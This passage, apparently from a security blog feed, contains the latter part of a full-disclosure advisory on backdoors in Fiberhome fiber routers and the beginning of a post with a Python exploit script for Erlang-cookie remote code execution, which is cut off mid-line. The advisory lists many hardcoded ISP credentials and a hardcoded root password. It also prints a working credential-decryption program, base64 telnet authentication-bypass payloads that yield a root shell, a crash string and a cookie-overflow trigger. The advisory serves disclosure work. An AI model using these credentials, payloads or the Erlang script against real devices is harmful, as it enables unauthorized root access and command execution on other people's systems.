IP:192.168.1.2 --------  <br>Login:  <br><span class="hljs-meta">telnet&gt;</span><span class="bash"> q</span>  <br>Connection closed.  <br>  <br>  <br>Closing the access to the telnetd:  <br>  <br><span class="hljs-meta">$</span><span class="bash"> curl -k <span class="hljs-string">&#x27;https://192.168.1.1/telnet?enable=0&amp;key=[REMOVED]&#x27;</span></span>  <br><span class="hljs-meta">$</span><span class="bash"> telnet 192.168.1.1 23</span>  <br>Trying 192.168.1.1...  <br>telnet: connect to address 192.168.1.1: Connection refused  <br>telnet: Unable to connect to remote host  <br>  <br>  <br>The IPv4 firewall rules before and after triggering the backdoor:  <br>  <br>Access is being blocked:  <br>  <br><span class="hljs-meta">#</span><span class="bash">iptables-save |grep telnet</span>  <br>:input_ext_access_telnet_ani - [0:0]  <br>:input_ext_access_telnet_uni - [0:0]  <br>-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j  <br>input_ext_access_telnet_uni  <br>-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j  <br>input_ext_access_telnet_ani  <br>-A input_ext_access_telnet_ani -i tel0 -p tcp -m tcp --dport 23 -j ACCEPT  <br>-A input_ext_access_telnet_ani -i br0 -p tcp -m tcp --dport 23 -j ACCEPT  <br>-A input_ext_access_telnet_ani -p tcp -m tcp --dport 23 -j REJECT  <br>--reject-with tcp-reset  <br>-A input_ext_access_telnet_uni -i br0 -p tcp -m tcp --dport 23 -j  <br>REJECT --reject-with tcp-reset  <br>  <br>  <br>Access is allowed:  <br>  <br><span class="hljs-meta">#</span><span class="bash">iptables-save |grep telnet</span>  <br>:input_ext_access_telnet_ani - [0:0]  <br>:input_ext_access_telnet_uni - [0:0]  <br>-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j  <br>input_ext_access_telnet_uni  <br>-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j  <br>input_ext_access_telnet_ani  <br>-A input_ext_access_telnet_ani -i tel0 -p tcp -m tcp --dport 23 -j ACCEPT  <br>-A input_ext_access_telnet_ani -i br0 -p tcp -m tcp --dport 23 -j ACCEPT  <br>-A input_ext_access_telnet_ani -p tcp -m tcp --dport 23 -j REJECT  <br>--reject-with tcp-reset  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - HTTP Server - Hardcoded credentials</span></span>  <br>  <br>The web daemon contains a list of hardcoded credentials, for different ISPs:  <br>  <br>- - user / user1234  <br>- - f~i!b@e#r$h%o^m*esuperadmin / s(f)u_h+g|u  <br>- - admin / lnadmin  <br>- - admin / CUadmin  <br>- - admin / admin  <br>- - telecomadmin / nE7jA%5m  <br>- - adminpldt / z6dUABtl270qRxt7a2uGTiw  <br>- - gestiontelebucaramanga / t3l3buc4r4m4ng42013  <br>- - rootmet / m3tr0r00t  <br>- - awnfibre / fibre@dm!n  <br>- - trueadmin / admintrue  <br>- - admin / G0R2U1P2ag  <br>- - admin / 3UJUh2VemEfUtesEchEC2d2e  <br>- - admin / getOnuMac(s, 6, 32); &lt;- last part of the MAC address of  <br>the `br0` interface  <br>- - admin / 888888  <br>- - L1vt1m4eng / 888888  <br>- - useradmin / 888888  <br>- - user / 888888  <br>- - admin / 1234  <br>- - user / tattoo@home  <br>- - admin / tele1234  <br>- - admin / aisadmin  <br>  <br>  <br>You can find the incomplete list below:  <br>  <br>[please use the HTML version at  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>to see the image]  <br>  <br>[please use the HTML version at  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>to see the image]  <br>  <br>  <br>I really like `m3tr0r00t` :)  <br>  <br>There are passwords everywhere in the `webs` binary (HTTP Server).  <br>  <br>These credentials, used with `https://ip/fh` will allow to open the  <br>access to the CLI telnet on port 23/tcp.  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - HTTP Server - TR-069 hardcoded credentials</span></span>  <br>  <br>We can find hardcoded credentials inside the `webs` binary for TR-069:  <br>  <br>`telecomadmin`  <br>  <br>[please use the HTML version at  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>to see the image]  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - HTTP Server - Credentials decryption algorithm</span></span>  <br>  <br>By default, some credentials appear to be encrypted (in  <br>`/fhconf/umconfig.txt` file).  <br>  <br>It is possible to decrypt them using the encryption function found  <br>inside the webs binary. This algorithm uses mainly xor with the  <br>hardcoded key `*j7a(L#yZ98sSd5HfSgGjMj8;Ss;d)(*&amp;^#@$a2s0i3g` so we can  <br>encrypt passwords and decrypt &quot;encrypted&quot; passwords:  <br>  <br>[please use the HTML version at  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>to see the image]  <br>  <br>  <br>A re-implementation in C can be shown below:  <br>  <br><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span>  <br><span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span>  <br>  <br>  <br>int main(int argc,  <br>char **argv,  <br>char **envp)  <br>&#123;  <br>char key[45] = &quot;*j7a(L#yZ98sSd5HfSgGjMj8;Ss;d)(*&amp;^#@$a2s0i3g&quot;;  <br>  <br>char password[12] = &quot;\x59\x42\x51\x48\x5d\x13\x4b\x52\x3d\x45\x4d\x00&quot;;  <br>//char password[12] = &quot;s(f)u_h+g|u\x00&quot;;  <br>  <br>unsigned char encrypted_char;  <br>  <br>for (int i = 0; i &lt; strlen(password); i++)  <br>&#123;  <br>encrypted_char = password[i] ^ key[i % sizeof(key)];  <br>  <br>if (encrypted_char &amp;&amp; !(encrypted_char &amp; 0x2000))  <br>printf(&quot;%c&quot;, encrypted_char);  <br>&#125;  <br>  <br>printf(&quot;\n&quot;);  <br>  <br>return (0);  <br>&#125;  <br>  <br>  <br>And it works:  <br>  <br><span class="hljs-meta">$</span><span class="bash"> cc decrypt-passwords-umconfig.c -o decrypt-passwords-umconfig &amp;&amp;</span>  <br>./decrypt-passwords-umconfig | hexdump -C  <br>00000000 73 28 66 29 75 5f 68 2b 67 7c 75 0a |s(f)u_h+g|u.|  <br>0000000c  <br>  <br>  <br>Interesting fact: we previously found this hardcoded key in FTTH OLTs  <br>from another FTTH vendor:  <br>https://pierrekim.github.io/blog/2020-07-07-cdata-olt-0day-vulnerabilities.html#weak-encryption-algorithm  <br>  <br>It appears this key and this algorithm come from GoAhead:  <br>  <br>https://github.com/BruceYang-yeu/goahead-1/blob/master/um.c#L51  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - Telnet server (Linux) - Hardcoded credentials</span></span>  <br>  <br>A hardcoded password for root is being defined inside  <br>`/etc/init.d/system-config.sh`:  <br>  <br><span class="hljs-meta">#</span><span class="bash">cat /etc/init.d/system-config.sh</span>  <br><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span>  <br>  <br>case &quot;$1&quot; in  <br>start)  <br>echo &quot;Configuring system...&quot;  <br><span class="hljs-meta">#</span><span class="bash"> these are some miscellaneous stuff without a good home</span>  <br>mount -o remount,sync /fhconf  <br>mkdir -p /dev/shm/fhdrv_kdrv_ver_tmp  <br>/dev/shm/usr_tmp /fhconf/data  <br>echo &quot;root:W/xa5OyC3jjQU:0:0:root:/:bin/sh&quot; &gt; /etc/passwd  <br>echo &quot;nobody:x:99:99:Nobody:/:/bin/false&quot; &gt;&gt; /etc/passwd  <br>ifconfig lo 127.0.0.1 netmask 255.0.0.0 broadcast  <br>127.255.255.255 up  <br>echo &gt; /var/udhcpd/udhcpd.leases  <br>exit 0  <br>;;  <br>  <br><span class="hljs-meta">#</span><span class="bash"> cat /etc/passwd</span>  <br>root:W/xa5OyC3jjQU:0:0:root:/:bin/sh  <br>nobody:x:99:99:Nobody:/:/bin/false  <br>  <br>  <br>`W/xa5OyC3jjQU` is the DES encrypted data for `GEPON`.  <br>  <br>This telnet server doesn&#x27;t run by default but it is possible to start  <br>it from the telnet CLI.  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - Telnet server (CLI) - Hardcoded credentials</span></span>  <br>  <br>telnet on port 23/tcp can be also abused with these credentials:  <br>  <br>- - `gpon`/`gpon`  <br>- - enable: `gpon`  <br>  <br>  <br><span class="hljs-meta">$</span><span class="bash"> nc -v 192.168.1.1 23</span>  <br>Connection to 192.168.1.1 23 port [tcp/telnet] succeeded!  <br>  <br>------acl IP:192.168.1.2 --------  <br>Login: gpon  <br>gpon  <br>Password: gpon  <br><span class="hljs-meta">User&gt;</span><span class="bash"> <span class="hljs-built_in">enable</span></span>  <br>enable  <br>Password: gpon  <br>****  <br><span class="hljs-meta">Config#</span><span class="bash"> </span> <br>  <br>  <br>We can retrieve these backdoors by reversing the  <br>`libci_adaptation_layer.so` library:  <br>  <br>[please use the HTML version at  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>to see the image]  <br>  <br>  <br>For specific ISPs, there are these valid credentials:  <br>- - `admin` / 4 hexadecimal chars, generated in the  <br>`init_3bb_password()` function located in `libci_adaptation_layer.so`  <br>- - `rdsadmin` / `6GFJdY4aAuUKJjdtSn7d`  <br>  <br>  <br>You can also test `gepon`/`gepon` (from the firmware extracted in the  <br>other analyzed fiberhome device (AN5506-04-FA, firmware RP2631, 4  <br>April 2019)).  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - Telnet server (CLI) - Privilege escalation</span></span>  <br>  <br>The CLI telnet server runs on port 23/tcp and can be reached by (i)  <br>adding firewall rules from the HTTP server either using the backdoor  <br>API, (ii) using backdoor credentials on the web interface or (iii)  <br>exploiting a stack overflow in previous HTTP daemons.  <br>It is also reachable by default over IPv6 on `br0` and `wan0` interface.  <br>  <br>It is possible to start a Linux telnetd as root on port 26/tcp using  <br>the CLI interface, as shown below:  <br>  <br><span class="hljs-meta">User&gt;</span><span class="bash"> ddd</span>  <br><span class="hljs-meta">WRI(DEBUG_H)&gt;</span><span class="bash"> shell</span>  <br>Please use port 26 to telnet  <br><span class="hljs-meta">WRI(DEBUG_H)&gt;</span><span class="bash"> tshell</span>  <br>Please use port 26 to telnet  <br>  <br>  <br>`shell` and `tshell` will call the function `enter_telnet_shell()`  <br>from `libcli_cli.so`, running `system(&quot;telnet -p 26&quot;)`.  <br>This telneld will then use hardcoded credentials.  <br>  <br>[please use the HTML version at  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>to see the image]  <br>  <br>  <br>Surprisingly, there is another function called `enter_tshell` (for a  <br>legacy `tshell`) which will run a `system(&quot;sh&quot;)` as root.  <br>  <br>This function `enter_tshell()` providing a rootshell is not being  <br>called from `shell` so this looks like dead code:  <br>  <br>[please use the HTML version at  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>to see the image]  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - Telnet server (CLI) - Authentication bypass</span></span>  <br>  <br>It is possible to bypass telnet authentication by sending a specific  <br>string to the remote telnet server:  <br>  <br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;GgpoZWxwCmxpc3QKd2hvCg==&#x27;</span> | base64 -d &gt; bypass-auth-telnet</span>  <br><span class="hljs-meta">$</span><span class="bash"> hexdump -C bypass-auth-telnet</span>  <br>00000000 1a 0a 68 65 6c 70 0a 6c 69 73 74 0a 77 68 6f 0a  <br>|..help.list.who.|  <br>00000010  <br><span class="hljs-meta">$</span><span class="bash"> nc 192.168.1.1 23 &lt; bypass-auth-telnet</span>  <br>  <br>------acl IP:192.168.1.2 --------  <br>Login:  <br><span class="hljs-meta">User&gt;</span><span class="bash"> </span> <br><span class="hljs-meta">User&gt;</span><span class="bash"> <span class="hljs-built_in">help</span></span>  <br>  <br>This system provides help feature as described below.  <br>  <br>1. Anytime you need help, just press &quot;?&quot; and don&#x27;t  <br>press Enter,you can see each possible command argument  <br>and its description.  <br>  <br>2. You can also input &quot;list&quot; and then press Enter  <br>to execute this helpful command to view the list of  <br>commands you can use.  <br>  <br><span class="hljs-meta">User&gt;</span><span class="bash"> list</span>  <br>0. clear  <br>1. enable  <br>2. exit  <br>3. help  <br>4. list  <br>5. ping &#123;[-t]&#125;*1 &#123;[-count] &lt;1-65535&gt;&#125;*1 &#123;[-size] &lt;1-6400&gt;&#125;*1  <br>&#123;[-waittime] &lt;1-255&gt;&#125;*1 &#123;[-ttl] &lt;1-255&gt;&#125;*1 &#123;[-pattern]  <br>&lt;user_pattern&gt;&#125;*1 &#123;[-i] &lt;A.B.C.C&gt;&#125;*1 &lt;A.B.C.D&gt;  <br>6. quit  <br>7. show history  <br>8. show idle-timeout  <br>9. show ip  <br>10. show services  <br>11. show syscontact  <br>12. show syslocation  <br>13. terminal length &lt;0-512&gt;  <br>14. who  <br>15. who am i  <br><span class="hljs-meta">User&gt;</span><span class="bash"> who</span>  <br>SessionID. - UserName ---------- LOCATION ---------- MODE ----  <br>7 not login 192.168.1.2 not login (That&#x27;s me.)  <br>Total 1 sessions in current system.  <br><span class="hljs-meta">User&gt;</span><span class="bash"> </span> <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - Telnet server (CLI) - Authentication bypass to start the</span></span>  <br>Linux telnetd  <br>  <br>It is possible to use the previous authentication bypass to start a  <br>full telnetd server on port 26 and then get a root shell using the  <br>password from &quot;Telnet server (Linux) - Hardcoded credentials).  <br>  <br>By sending `ddd` then `tshell`, a telnetd will be started on port 26/tcp:  <br>  <br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> GgpoZWxwCmxpc3QKd2hvCmRkZAp0c2hlbGwK | base64 -d | nc target 23 &amp;</span>  <br>------acl IP:192.168.1.2 --------  <br>Login:  <br><span class="hljs-meta">User&gt;</span><span class="bash"> </span> <br><span class="hljs-meta">User&gt;</span><span class="bash"> <span class="hljs-built_in">help</span></span>  <br>  <br>This system provides help feature as described below.  <br>  <br>1. Anytime you need help, just press &quot;?&quot; and don&#x27;t  <br>press Enter,you can see each possible command argument  <br>and its description.  <br>  <br>2. You can also input &quot;list&quot; and then press Enter  <br>to execute this helpful command to view the list of  <br>commands you can use.  <br>  <br><span class="hljs-meta">User&gt;</span><span class="bash"> list</span>  <br>0. clear  <br>1. enable  <br>2. exit  <br>3. help  <br>  <br>  <br>  <br><span class="hljs-meta">$</span><span class="bash"> telnet target 26</span>  <br>Trying target...  <br>Connected to target.  <br>Escape character is &#x27;^]&#x27;.  <br>  <br>(none) login: root  <br>Password: [GEPON]  <br>  <br>  <br>BusyBox v1.27.2 (2019-04-01 19:16:06 CST) built-in shell (ash)  <br>Enter &#x27;help&#x27; for a list of built-in commands.  <br>  <br><span class="hljs-meta">#</span><span class="bash">id</span>  <br>uid=0(root) gid=0 groups=0  <br>  <br>  <br>The attacker will get a root shell.  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - Telnet server (CLI) - DoS</span></span>  <br>  <br>It is possible to crash the telnet daemon by sending a specific string:  <br>  <br><span class="hljs-meta">$</span><span class="bash"> hexdump -C crash-auth-telnet</span>  <br>00000000 1a 0a 65 6e 61 62 6c 65 0a 02 0a 1a 0a |..enable.....|  <br>0000000d  <br><span class="hljs-meta">$</span><span class="bash"> nc -v 192.168.1.1 23 &lt; crash-auth-telnet</span>  <br>192.168.1.1: inverse host lookup failed: Host name lookup failure  <br>(UNKNOWN) [192.168.1.1] 23 (telnet) open  <br><span class="hljs-meta">$</span><span class="bash"> nc -v 192.168.1.1 23 &lt; crash-auth-telnet</span>  <br>192.168.1.1: inverse host lookup failed: Host name lookup failure  <br>(UNKNOWN) [192.168.1.1] 23 (telnet) : Connection refused  <br>  <br>This segfault exists inside `/fh/extend/load_cli` but was not studied  <br>as the previous bypass already worked.  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - System - Credentials stored in clear-text</span></span>  <br>  <br>Some credentials are stored in clear-text with permissive rights:  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-built_in">pwd</span></span>  <br>/fhconf/fh_wifi  <br><span class="hljs-meta">#</span><span class="bash">ls -la</span>  <br>drwxr-xr-x 2 root 0 536 Jan 7 2020 .  <br>drwxr-xr-x 14 root 0 10264 Jan 8 15:29 ..  <br>-rw-r--r-- 1 root 0 118 Jan 1 1970 wifi_custom.cfg  <br>-rw-r--r-- 1 root 0 1212 Jan 7 2020 wifictl_2g.cfg  <br>-rw-r--r-- 1 root 0 1178 Jan 7 2020 wifictl_2g.cfg.bak  <br>-rw-r--r-- 1 root 0 1213 Jan 7 2020 wifictl_5g.cfg  <br>-rw-r--r-- 1 root 0 1208 Jan 7 2020 wifictl_5g.cfg.bak  <br>  <br><span class="hljs-meta">#</span><span class="bash">cat /fhconf/fh_wifi/wifi_custom.cfg</span>  <br>ssid_2g=[REMOVED]  <br>ssid_5g=[REMOVED]  <br>country=BR  <br>auth=WPAPSKWPA2PSK  <br>encrypt=tkipaes  <br>psk=[REMOVED]  <br><span class="hljs-meta">#</span><span class="bash"> </span> <br>  <br><span class="hljs-meta">#</span><span class="bash">cat wifictl_2g.cfg</span>  <br>[...]  <br>WPAPSK=[REMOVED]  <br>[...]  <br>WEPKey1=[REMOVED]  <br>[...]  <br>WEPKey2=[REMOVED]  <br>[...]  <br>WEPKey3=[REMOVED]  <br>[...]  <br>WEPKey4=[REMOVED]  <br>[...]  <br>RadiusKey=[REMOVED]  <br>  <br><span class="hljs-meta">#</span><span class="bash">cat wifictl_5g.cfg</span>  <br>SSID=[REMOVED]  <br>[...]  <br>WPAPSK=[REMOVED]  <br>[...]  <br>WEPKey1=[REMOVED]  <br>[...]  <br>WEPKey2=[REMOVED]  <br>[...]  <br>WEPKey3=[REMOVED]  <br>[...]  <br>WEPKey4=[REMOVED]  <br>[...]  <br>RadiusKey=[REMOVED]  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - Misc - Passwords stored in clear-text in nvram</span></span>  <br>  <br>Some passwords are stored in clear-text in nvram:  <br>  <br><span class="hljs-meta">#</span><span class="bash">nvram show</span>  <br>wl0.1_key=1  <br>wl0.1_key1=[REMOVED]  <br>wl0.1_key2=[REMOVED]  <br>wl0.1_key3=[REMOVED]  <br>wl0.1_key4=[REMOVED]  <br>[...]  <br>wl0.1_ssid=[REMOVED]  <br>[...]  <br>wl0.1_wpa_psk=[REMOVED]  <br>[...]  <br>wl0_key1=[REMOVED]  <br>wl0_key2=[REMOVED]  <br>wl0_key3=[REMOVED]  <br>wl0_key4=[REMOVED]  <br>[...]  <br>wl0_ssid=[REMOVED]  <br>[...]  <br>wl0_wpa_psk=[REMOVED]  <br>[...]  <br>[ passwords everywhere removed because of space ]  <br>[...]  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Details - Misc - Remote stack overflow in the HTTP server</span></span>  <br>(AN5506-04-FA / RP2631)  <br>  <br>I got another Fiberhome device with a different firmware version  <br>(AN5506-04-FA, firmware RP2631, 4 April 2019). The HG6245D and the  <br>AN5506-04-FA devices share a very similar code base.  <br>  <br>The firmware on the AN5506-04-FA device is vulnerable to a remote  <br>stack overflow in the `webs` process by sending a Cookie value with a  <br>length &gt; 511 bytes to any valid asp webpage. This can be triggered  <br>using a simple wget command:  <br>  <br><span class="hljs-meta">$</span><span class="bash"> wget --no-check-certificate -O- --header <span class="hljs-string">&#x27;Cookie:</span></span>  <br>loginName=AAAA[511bytes]AAAA&#x27; https://192.168.1.1/tr069/tr069.asp  <br>  <br>  <br>In the HG6245D firmware version RP2602, this vulnerability has been  <br>patched by checking the size of values in the cookies, so I was not  <br>able to exploit it. You can also read the log file to confirm the  <br>length is now checked:  <br>  <br>  <br>&lt;web_ga&gt;2020-01-08  <br>21:23:12,../thd_ga2_5/webs.c[1375](websParseRequest): Request header  <br>param value is too long! key: cookie  <br>  <br>It appears it has been patched in the HG6245D router, firmware RP2602.  <br>Firmware RP2631 (4 April 2019) for router AN5506-04-FA remains  <br>vulnerable.  <br>I found no CVE or public research about this vulnerability so it may  <br>have been silently patched by the vendor for the HG6245D router.  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Dorks</span></span>  <br>  <br>&quot;acl IP:&quot;  <br>&quot;GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.4.2-OPEN&quot;  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Vendor Response</span></span>  <br>  <br>Full-disclosure is applied as it is believed that some backdoors have  <br>been intentionally placed by the vendor.  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Report Timeline</span></span>  <br>  <br>* Jan 7, 2020: Majority of vulnerabilities found.  <br>* Jan 8, 2020: This advisory was written.  <br>* Aug 2020: Found the lack of IPv6 firewall.  <br>* Jan 9, 2021: Vulnerabilities checked again and the advisory was rewritten.  <br>* Jan 12, 2021: A public advisory is sent to security mailing lists.  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Credits</span></span>  <br>  <br>These vulnerabilities were found by Pierre Kim (@PierreKimSec).  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># References</span></span>  <br>  <br>https://pierrekim.github.io/advisories/2021-fiberhome-0x00-ont.txt  <br>  <br>https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html  <br>  <br>  <br>  <br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># Disclaimer</span></span>  <br>  <br>This advisory is licensed under a Creative Commons Attribution Non-Commercial  <br>Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/  <br>  <br>-----BEGIN PGP SIGNATURE-----  <br>  <br>iQIzBAEBCgAdFiEEoSgI9MSrzxDXWrmCxD4O2n2TLbwFAl/5sJsACgkQxD4O2n2T  <br>LbyPqw/9GUqpwf47Y3kn0PP8nlhhseRakIOPvLbhPcrB0erTg1vSja7wjqTrbHun  <br>5jDuVV8anLIIHfyR4p1BU0qgUzU29JcGl41t1+wQhG8mt5pvFofZlIlwUwhe2tJg  <br>fFMvGA3/YyGbKAKNRZQibbjnARCS9WYqZBWy/l3P1VUSY32mR1ifroENABG6s7Q+  <br>FnAtIzRufiFjOYe0iOPXeqKOe4z/JRtjznSc2YFhLid0TQC+rmh37mN+b8yPwmyX  <br>x01wMC904JF88qLQBym8VSLZkRuzyyrnsSZd5/BX1M6J8GQkxzyfUn2FBof2OnMJ  <br>i28qLmSxGd6TprhtB2XM9V6snomss/b9zvYXtdVjzCgDZ8/P07NvJf0Sxo5pOMJC  <br>60CHTsfQk0vREdHtibjiVR/XCEJkACkW+PDFo+Fvs4By3yJFhqar1cK4mujvwYe5  <br>392yAc77z96WXI0dwD/nxdNNyPM635hTuyFECMK8FTjnYBjSNjmYDmBRF2T3fxda  <br>oytz1qNnLT/JnPSZhByCz04ok1BSN/HQcUL9rFXmDGMKL12YmcgB/WpHF61CAw0q  <br>XKKKY6OtL1u3kB+EmEuCljiSZzV2zumN43Y3V5OewHDeQ+lZI+GSpWngcipcTy8y  <br>Xdj6+ehDf2Xd8AG9dDlO7yDUEO3gVRt+XAcbav7WW0JeFt4wwPg=  <br>=YoWf  <br>-----END PGP SIGNATURE-----  <br>  <br>--   <br>Pierre Kim  <br>pierre.kim.sec@gmail.com  <br>@PierreKimSec  <br>https://pierrekim.github.io/<br> <br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Privilege Escalation</tag>
      
      <tag>Disclosure</tag>
      
      <tag>Bypass</tag>
      
      <tag>Dos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Erlang Cookie Remote Code Execution</title>
    <link href="/2021/01/14/Erlang-Cookie-Remote-Code-Execution/"/>
    <url>/2021/01/14/Erlang-Cookie-Remote-Code-Execution/</url>
    
    <content type="html"><![CDATA[<h4 id="Erlang-Cookie-Remote-Code-Execution"><a href="#Erlang-Cookie-Remote-Code-Execution" class="headerlink" title="Erlang Cookie Remote Code Execution"></a>Erlang Cookie Remote Code Execution</h4><p>Erlang allows distributed Erlang instances to connect and remotely execute commands.<br>Nodes are permitted to connect to eachother if they share an authentication cookie,<br>this cookie is commonly called “.erlang.cookie”</p><figure class="highlight python"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python3</span><br>​<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> sys<br>​<br>TARGET = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br>PORT = <span class="hljs-number">25672</span><br>COOKIE = <span class="hljs-string">&quot;XXXXXXXXXXXXXXXXXXXX&quot;</span><br>CMD = <span class="hljs-string">&quot;whoami&quot;</span><br>​<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>s.connect((TARGET, PORT))<br>​<br>name_msg  = <span class="hljs-string">b&quot;\x00&quot;</span><br>name_msg += <span class="hljs-string">b&quot;\x15&quot;</span><br>name_msg += <span class="hljs-string">b&quot;n&quot;</span><br>name_msg += <span class="hljs-string">b&quot;\x00\x07&quot;</span><br>name_msg += <span class="hljs-string">b&quot;\x00\x03\x49\x9c&quot;</span><br>name_msg += <span class="hljs-string">b&quot;AAAAAA@AAAAAAA&quot;</span><br>​<br>s.send(name_msg)<br>s.recv(<span class="hljs-number">5</span>)                    <span class="hljs-comment"># Receive &quot;ok&quot; message</span><br>challenge = s.recv(<span class="hljs-number">1024</span>)     <span class="hljs-comment"># Receive &quot;challenge&quot; message</span><br>challenge = struct.unpack(<span class="hljs-string">&quot;&gt;I&quot;</span>, challenge[<span class="hljs-number">9</span>:<span class="hljs-number">13</span>])[<span class="hljs-number">0</span>]<br>​<br>print(<span class="hljs-string">&quot;Extracted challenge: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(challenge))<br>​<br>challenge_reply  = <span class="hljs-string">b&quot;\x00\x15&quot;</span><br>challenge_reply += <span class="hljs-string">b&quot;r&quot;</span><br>challenge_reply += <span class="hljs-string">b&quot;\x01\x02\x03\x04&quot;</span><br>challenge_reply += md5(<span class="hljs-built_in">bytes</span>(COOKIE, <span class="hljs-string">&quot;ascii&quot;</span>) + <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(challenge), <span class="hljs-string">&quot;ascii&quot;</span>)).digest()<br>​<br>s.send(challenge_reply)<br>challenge_res = s.recv(<span class="hljs-number">1024</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(challenge_res) == <span class="hljs-number">0</span>:<br>    print(<span class="hljs-string">&quot;Authentication failed, exiting&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br>​<br>print(<span class="hljs-string">&quot;Authentication successful&quot;</span>)<br>​<br>ctrl = <span class="hljs-string">b&quot;\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00w\x00w\x03rex&quot;</span><br>msg  = <span class="hljs-string">b&#x27;\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k&#x27;</span><br>msg += struct.pack(<span class="hljs-string">&quot;&gt;H&quot;</span>, <span class="hljs-built_in">len</span>(CMD))<br>msg += <span class="hljs-built_in">bytes</span>(CMD, <span class="hljs-string">&#x27;ascii&#x27;</span>)<br>msg += <span class="hljs-string">b&#x27;jw\x04user&#x27;</span><br>​<br>payload = <span class="hljs-string">b&#x27;\x70&#x27;</span> + ctrl + msg<br>payload = struct.pack(<span class="hljs-string">&#x27;!I&#x27;</span>, <span class="hljs-built_in">len</span>(payload)) + payload<br>print(<span class="hljs-string">&quot;Sending cmd: &#x27;&#123;&#125;&#x27;&quot;</span>.<span 